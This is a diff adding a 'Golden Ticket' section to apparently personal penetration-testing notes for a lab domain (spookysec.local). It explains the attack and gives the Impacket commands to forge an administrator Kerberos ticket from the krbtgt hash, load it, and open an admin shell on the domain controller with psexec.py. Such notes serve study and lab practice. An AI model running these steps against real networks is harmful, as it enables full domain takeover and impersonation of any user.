@@ -397,6 +397,35 @@ This works because Windows tries to resolve the target path of a shortcut and th
 {% endhint %}
 
 ***
+## Golden Ticket:
+
+* Forged a ticket that's signed with krbtgt service account's hash. Specifically this one - it's the KDC's service account.
+* If you have this, you can create a ticket for and impersonate any user - not just administrator. This means full domain compromise. 
+* When this ticket is decrypted by the DC, the attacker can have unrestricted access to anything in the domain.
+
+
+1. Create a TGT claiming to be administrator. Will create a CCache (Credential Cache) file storing the TGT claiming to be the administrator.
+
+```shellscript
+root@kali:~# python ticketer.py -nthash [KRBTGT Hash] -domain-sid [Domain SID] -domain spookysec.local administrator
+```
+
+2. Export the ticket. This tells Kerberos to use the ticket stored in the standard location KRB5CCNAME where legitimate Kerberos tickets would be stored otherwise.
+
+```shellscript
+root@kali:~# export KRB5CCNAME=./administrator.ccache
+```
+
+3. Use the ticket. Will result in an admin shell. Signature looks valid to the DC (signed with the krbtgt account hash) so it will be accepted completely. 
+
+```shellscript
+root@kali:~# psexec.py -k -no-pass [Domain]/[Username - in this case, administrator]@[DC IP]
+```
+
+
+
+
+***
 
 
 
